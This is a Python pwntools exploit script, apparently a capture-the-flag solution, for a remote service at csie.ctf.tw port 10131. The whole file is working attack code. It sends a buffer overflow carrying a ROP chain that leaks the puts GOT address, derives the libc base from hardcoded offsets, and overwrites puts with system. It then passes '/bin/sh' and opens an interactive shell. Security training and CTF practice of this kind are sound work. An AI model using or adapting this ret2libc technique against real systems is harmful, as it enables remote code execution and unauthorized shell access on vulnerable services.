#!/usr/bin/env python
from pwn import *

r = remote("csie.ctf.tw",10131)

context.arch = "amd64"

puts_got = 0x0000000000601018
pop_rdi = 0x00000000004006f3
puts_plt = 0x4004e0
gets_plt = 0x400510

payload = "a"*40
payload += flat([pop_rdi,puts_got,puts_plt,pop_rdi,puts_got,gets_plt,pop_rdi,puts_got+8,puts_plt])
r.recvuntil(":")
r.sendline(payload)
r.recvuntil("\n")
puts = u64(r.recvuntil("\n").strip().ljust(8,"\x00"))
print hex(puts)
libc = puts - 0x6f690
system = libc + 0x45390
payload = p64(system) + "/bin/sh\x00"
r.sendline(payload)
r.interactive()

